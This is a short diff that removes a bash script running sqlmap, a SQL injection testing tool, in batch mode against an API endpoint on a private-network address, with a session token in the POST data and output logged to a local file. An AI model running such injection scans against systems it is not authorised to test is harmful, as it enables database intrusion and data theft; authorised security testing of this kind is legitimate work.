@@ -1,2 +1,0 @@
-#!/bin/bash
-python /Users/zhaichuang/Downloads/sqlmapproject-sqlmap-1c737d7/sqlmap.py -u "http://172.16.56.199/api/whistleMS/index.php" --data "m=notice&a=getNoticeList&device_type=web&school=ligong&verify=92713_MS_ligong__web__5a5f30854f568__aee07493fbb19db6579882e7d4b80393__86269202-142f-4740-99b2-21324ea1c133&page=1" --level=1 --batch >>/Users/zhaichuang/Desktop/python/GjWshile/MS/MS_logfiles/21.log
